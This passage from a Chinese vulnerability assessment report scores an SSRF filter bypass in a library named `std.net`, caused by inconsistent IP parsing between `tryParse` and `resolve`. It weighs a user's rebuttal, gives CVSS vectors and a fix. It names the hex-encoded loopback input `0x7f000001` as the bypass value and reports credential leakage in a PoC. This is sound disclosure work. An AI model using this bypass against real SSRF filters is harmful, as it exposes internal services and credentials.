2. **内网服务如果包含敏感数据，应自行提供鉴权/身份认证**——否则该服务本身就有安全风险；数据泄露是服务侧的责任，不是基础库的责任。

#### 10.1.1 对论点 1 的回应

**部分成立。** 漏洞确实需要应用使用特定模式才能触发——攻击者无法控制应用是否使用此模式。但在 CVSS 语境下：

- AC（Attack Complexity）衡量的是"攻击者无法控制的条件是否容易满足"。
- "tryParse 做 IP 过滤 + 原始字符串传给 TcpSocket 连接"是网络库中最常见的安全过滤范式，不是边缘用法。
- 因此 AC 仍为 L（Low），但承认这不是库自身的直接风险——库提供的是不一致的 API 语义，实际安全影响需要应用代码桥接。

**接受的影响：** 基础库的 CVSS 评分应反映库本身的贡献（API 语义不一致导致 SSRF 过滤可被绕过），而非 PoC 场景中所有组件叠加的总后果。

#### 10.1.2 对论点 2 的回应

**成立。** PoC 中实际泄露凭据（C:H）是两个因素叠加的结果：

1. 库的 API 不一致导致 SSRF 过滤绕过（库的责任）
2. 内网服务暴露敏感数据且无鉴权（服务的责任）

如果服务自行提供了鉴权，SSRF 绕过不会导致凭据泄露。因此：

- 库的固有贡献是**使 SSRF 过滤可被绕过**（C:L——创造了信息泄露的机会）
- 实际的凭据泄露（C:H）是库 + 服务叠加的结果，不应完全归因于库
- 库的事实评分应使用 C:L 而非 C:H

### 10.2 最终评分

基于以上分析，`std.net` 作为基础库，其固有风险评分为 **Medium**。

| 体系 | 向量 | 分数 | 等级 |
|---|---|---:|---|
| CVSS 3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` | **6.5** | **Medium** |
| CVSS 4.0 | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N` | **~5.8** | **Medium** |

指标依据：

| 指标 | 值 | 依据 |
|---|---|---|
| AV | N | 攻击输入来自网络（用户提供的 host） |
| AC | L | 利用本身简单（提交 `0x7f000001`）；"tryParse 过滤 + TcpSocket 连接"是常见模式 |
| AT (4.0) | **P** | 基础库——需特定部署条件：应用使用脆弱模式 + resolver 接受 legacy numeric IPv4 + 内部服务存在 |
| PR | N | 无需认证 |
| UI | N | 无用户交互 |
| S | U | 库的漏洞影响使用它的应用；内部服务安全是服务自身的责任 |
| C / SC | L / L | 库使 SSRF 过滤可被绕过（创造信息泄露机会）；实际泄露取决于服务是否有鉴权 |
| I / SI | L / L | 潜在完整性影响（可向内部服务发任意请求） |
| A / VA, SA | N / N, N | 无可用性影响 |

> AT=P 的理由：`std.net` 是基础库，漏洞是否触发取决于应用是否使用脆弱模式、目标环境 resolver 行为、内部服务是否存在——这些是特定部署条件，CVSS 4.0 用 AT=P 反映此事实。CVSS 3.1 无 AT 维度，分数 6.5 在 Medium 区间。
>
> PoC 完整链路（含应用脆弱模式 + 无鉴权服务）的实际后果可达 High（CVSS 3.1 = 8.6 with S:C），但这不完全是库的责任——数据泄露是库 + 无鉴权服务叠加的结果。

### 10.3 漏洞成立性确认

| 确认项 | 结论 | 依据 |
|---|---|---|
| API 语义不一致是否存在 | **确认** | `tryParse` 仅认点分十进制；`resolve` 委托 `getaddrinfo` 接受十六进制——逐行验证 |
| SSRF 过滤可被绕过 | **确认** | PoC 日志：`0x7f000001` 通过 `tryParse` 过滤，`resolve` 解析为 `127.0.0.1` |
| 绕过后可连接内部服务 | **确认** | PoC 日志：`HTTP/1.0 200 OK` |
| 实际数据泄露 | **确认（共享责任）** | PoC 日志：凭据泄露。但这是库 + 无鉴权服务叠加的结果 |
| 库的固有风险等级 | **Medium** | 库提供不一致的 API 语义，使应用的安全过滤可被绕过 |
| 用户反驳"服务应自行鉴权" | **成立** | 数据泄露是共享责任；库的固有贡献是 C:L（使过滤可被绕过） |

### 10.4 最终判定

| 项目 | 结论 |
|---|---|
| 漏洞是否成立 | **成立** — API 语义不一致真实存在且可被利用 |
| 最终定级 | **Medium** |
| CVSS 3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` = **6.5 Medium** |
| CVSS 4.0 | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N` = **~5.8 Medium** |
| 修复建议 | 统一 `tryParse` 和 `resolve` 的解析语义，或在文档中明确警告两者不一致且 `tryParse` 不可用于安全过滤 |
